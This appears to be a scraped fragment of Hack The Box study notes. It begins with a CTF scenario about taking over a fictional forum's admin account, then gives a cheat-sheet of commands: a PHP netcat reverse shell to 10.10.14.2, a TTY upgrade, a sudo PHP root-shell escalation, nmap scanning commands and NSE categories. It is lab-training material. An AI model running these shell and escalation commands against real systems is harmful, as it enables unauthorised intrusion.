Every post and reply is carefully monitored, and the most zealous praise is rewarded with higher loyalty scores. Behind the scenes, a small cadre of administrators wields absolute control, silencing dissent and shaping the narrative to serve the regime’s ambitions. Task Force Phoenix has identified the forum’s admin account as a critical target. Gaining access would allow the task force to disrupt the flow of propaganda and strike a blow against the regime’s information control. Recently, we managed to secure a backup copy of the forum server from an unsecured FTP server. Can you analyze the platform’s architecture and code to uncover any weaknesses that might grant us access to the admin account?\u0026rdquo;\nRemote code execution # PHP code\n\u0026lt;?php system (\u0026#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.10.14.2 9443 \u0026gt;/tmp/f\u0026#34;); ?\u0026gt; Upgrading shell to TTY\npython3 -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; Privilege Escalation via PHP # You can spawn a root shell like this:\nsudo /usr/bin/php -r 'system(\u0026quot;/bin/bash\u0026quot;);'\nWay Forward # Root a Retired Easy Box\nRoot a Retired Medium Box\nRoot an Active Box\nComplete an Easy Challenge\nShare a Walkthrough of a Retired Box\nComplete Offensive Academy Modules\nRoot Live Medium/Hard Boxes\nComplete A Track\nWin a Hack The Box Battlegrounds Battle\nComplete A Pro Lab\nHost Discovery Using Nmap # sudo nmap 10.129.2.0/24 -sn -oA tnet | grep for | cut -d\u0026#34; \u0026#34; -f5 Nmap Banner Grabbing # nmap 10.129.96.46 -p 22,80,110,139,143,445,31337 -sV -Pn -n --disable-arp-ping --packet-trace Nmap Scripting Engine # Nmap Scripting Engine (NSE) is another handy feature of Nmap. It provides us with the possibility to create scripts in Lua for interaction with certain services. There are a total of 14 categories into which these scripts can be divided:\nCategory Description auth Determination of authentication credentials. broadcast Scripts, which are used for host discovery by broadcasting and the discovered hosts, can be automatically added to the remaining scans. brute Executes scripts that try to log in to the respective service by brute-forcing with credentials. default Default scripts executed by using the -sC option. discovery Evaluation of accessible services. dos These scripts are used to check services for denial of service vulnerabilities and are used less as it harms the services. exploit This category of scripts tries to exploit known vulnerabilities for the scanned port. external Scripts that use external services for further processing. fuzzer This uses scripts to identify vulnerabilities and unexpected packet handling by sending different fields, which can take much time. intrusive Intrusive scripts that could negatively affect the target system. malware Checks if some malware infects the target system. safe Defensive scripts that do not perform intrusive and destructive access. version Extension for service detection. vuln Identification of specific vulnerabilities.
